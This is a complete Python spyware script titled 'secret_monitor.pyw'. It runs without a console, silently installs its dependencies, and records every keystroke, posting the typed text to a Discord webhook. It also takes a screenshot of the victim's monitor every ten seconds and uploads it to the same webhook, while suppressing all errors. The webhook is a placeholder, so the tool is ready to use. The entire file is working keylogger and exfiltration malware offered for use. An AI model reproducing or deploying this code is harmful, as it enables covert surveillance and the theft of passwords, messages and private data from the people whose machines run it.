# File name -> secret_monitor.pyw
# Sends screenshots + keystrokes to Discord

import mss
import mss.tools
import requests
import time
import os
import json
import datetime
import threading
from pynput import keyboard

# ------------------ Configuration ------------------
DISCORD_WEBHOOK = " YOU'R Discord WebHook Link "

INTERVAL_SECONDS = 10         # Seconds between screenshots
MONITOR_NUMBER = 1            # 1 = primary monitor, 0 = all monitors
TEXT_BUFFER_SIZE = 50         # Send text after 50 characters
CAPTURE_FILENAME = "screen_capture.png"
# ---------------------------------------------------

# Auto-install missing libraries
try:
    import mss
except ImportError:
    os.system('pip install mss > nul 2>&1')
    import mss

try:
    import requests
except ImportError:
    os.system('pip install requests > nul 2>&1')
    import requests

try:
    from pynput import keyboard
except ImportError:
    os.system('pip install pynput > nul 2>&1')
    from pynput import keyboard


# ==========================================================
# 1. TEXT LOGGER
# ==========================================================
class TextLogger:
    def __init__(self, webhook, buffer_size=50):
        self.webhook = webhook
        self.buffer = ""
        self.buffer_size = buffer_size
        self.lock = threading.Lock()

    def send_text(self, text):
        """Send typed text to Discord"""
        if not text.strip():
            return
        try:
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            payload = {
                "content": f"⌨️ **Typed at {timestamp}:**\n```\n{text}\n```"
            }
            requests.post(self.webhook, json=payload, timeout=10)
        except Exception:
            pass

    def on_press(self, key):
        """Called on every key press"""
        try:
            char = None
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
            else:
                special = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[⌫]',
                }
                char = special.get(key, '')

            if char:
                with self.lock:
                    self.buffer += char
                    if len(self.buffer) >= self.buffer_size:
                        text_to_send = self.buffer
                        self.buffer = ""
                        threading.Thread(
                            target=self.send_text,
                            args=(text_to_send,),
                            daemon=True
                        ).start()
        except Exception:
            pass

    def flush(self):
        """Send remaining text in buffer"""
        with self.lock:
            if self.buffer:
                self.send_text(self.buffer)
                self.buffer = ""

    def start(self):
        """Start the keyboard listener in background"""
        listener = keyboard.Listener(on_press=self.on_press)
        listener.daemon = True
        listener.start()


# ==========================================================
# 2. SCREENSHOT LOGGER
# ==========================================================
def send_screenshot_to_discord(filepath, webhook_url):
    """Send a screenshot to Discord"""
    try:
        with open(filepath, 'rb') as f:
            files = {'file': (os.path.basename(filepath), f, 'image/png')}
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            payload = {
                "content": f"📸 **Screenshot** — `{ts}`"
            }
            response = requests.post(
                webhook_url,
                data=payload,
                files=files,
                timeout=15
            )
            return response.status_code in (200, 204)
    except Exception:
        return False


def screenshot_loop():
    """Continuously capture and send screenshots"""
    while True:
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[MONITOR_NUMBER]
                screenshot = sct.grab(monitor)
                mss.tools.to_png(
                    screenshot.rgb,
                    screenshot.size,
                    output=CAPTURE_FILENAME
                )

            send_screenshot_to_discord(CAPTURE_FILENAME, DISCORD_WEBHOOK)

            try:
                os.remove(CAPTURE_FILENAME)
            except Exception:
                pass

        except Exception:
            pass

        time.sleep(INTERVAL_SECONDS)


# ==========================================================
# 3. MAIN
# ==========================================================
if __name__ == "__main__":
    text_logger = TextLogger(DISCORD_WEBHOOK, TEXT_BUFFER_SIZE)
    text_logger.start()
    screenshot_loop()
